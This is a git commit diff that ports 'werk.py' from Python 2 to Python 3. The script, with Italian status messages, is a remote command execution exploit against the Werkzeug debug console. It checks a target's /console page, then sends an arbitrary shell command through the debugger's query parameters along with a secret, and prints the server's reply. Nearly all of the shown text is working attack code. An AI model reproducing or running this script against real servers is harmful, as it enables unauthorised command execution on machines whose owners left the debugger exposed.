ce1380f0b57b5316317ec4c1ecc26279baa32fd0
h4t4way <62147498+H4t4way@users.noreply.github.com>
2021-05-31 00:42:04 +0200

    Update werk.py

--- werk.py
+++ werk.py
@@ -5,13 +5,13 @@ import sys
 import re
 
 if len(sys.argv) != 3:
-    print ("USAGE: python2 %s url command" % (sys.argv[0]))
+    print("USAGE: python3 %s url command" % (sys.argv[0]))
     sys.exit(-1)
 
 response = requests.get('http://%s/console' % (sys.argv[1]))
 
 if response.status_code != 200:
-    print('[-] Debug non e' abilitato')
+    print("[-] Debug non e' abilitato")
     sys.exit(1)
     
 
@@ -26,10 +26,10 @@ else:
     secret = secret[0]
     print("[+] SECRET e': "+str(secret))
 """
-print "[+] Esecuzione  %s on %s" % (sys.argv[2],sys.argv[1])
+print("[+] Esecuzione  %s on %s" % (sys.argv[2],sys.argv[1]))
 
 response = requests.get("http://%s/console?__debugger__=yes&cmd=%s&frm=0&s=%s" % (sys.argv[1],str(cmd),secret))
 
-print "[+] Risposta dal server"
-print "status code: " + str(response.status_code)
-print "response: "+ str(response.text)
+print("[+] Risposta dal server")
+print("status code: " + str(response.status_code))
+print("response: "+ str(response.text))
